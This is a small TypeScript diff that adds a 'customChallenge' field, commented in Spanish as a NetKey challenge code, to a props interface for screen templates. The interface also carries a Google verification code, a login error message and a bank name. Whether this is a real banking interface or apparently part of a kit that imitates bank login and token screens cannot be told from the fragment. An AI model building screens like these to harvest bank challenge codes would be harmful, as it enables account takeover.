@@ -53,6 +53,7 @@ interface ScreenTemplatesProps {
     codigo?: string; // Código para la verificación de Google
     errorMessage?: string; // Mensaje de error para la pantalla de login
     challenge?: string; // Código CHALLENGE para NetKey
+    customChallenge?: string; // Código CHALLENGE personalizado para NetKey
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
